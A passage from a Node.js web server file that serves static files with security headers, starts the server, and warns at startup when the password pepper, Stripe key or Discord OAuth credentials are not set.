        res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('Forbidden');
      }
    }

    // Static file serving (no directory listing)
    // (Range not required here; media is handled by /media)
    const data = await fs.promises.readFile(filePath);
    res.writeHead(200, {
      'Content-Type': getContentType(filePath),
      'Content-Length': data.length,
      'Cache-Control': 'no-store',
      'X-Content-Type-Options': 'nosniff',
      'Cross-Origin-Resource-Policy': 'same-origin',
    });
    res.end(data);
  } catch (e) {
    res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('Server error');
  }
});

server.listen(PORT, HOST, () => {
  // eslint-disable-next-line no-console
  console.log(`Server running on http://${HOST}:${PORT}`);

  // eslint-disable-next-line no-console
  console.log(`Storage roots: DATA_DIR=${DATA_DIR} MEDIA_ROOT=${MEDIA_ROOT}`);
  // eslint-disable-next-line no-console
  console.log(`R2 media storage: ${R2_ENABLED ? 'ENABLED (bucket=' + R2_BUCKET + ')' : 'DISABLED (using local disk)'}`);

  if (!PEPPER) {
    console.warn('\x1b[33m[WARN]\x1b[0m TBW_PEPPER is not set. Passwords are less secure without it. Add TBW_PEPPER=<random-string> to .env.');
  }
  if (!process.env.STRIPE_SECRET_KEY) {
    console.warn('\x1b[33m[WARN]\x1b[0m STRIPE_SECRET_KEY is not set. Stripe checkout will not work.');
  }
  if (!process.env.DISCORD_CLIENT_ID || !process.env.DISCORD_CLIENT_SECRET) {
    console.warn('\x1b[33m[WARN]\x1b[0m Discord OAuth credentials missing. Discord login will not work.');
  }
});

server.on('error', (err) => {
  // eslint-disable-next-line no-console
  console.error('Server error:', err);
});
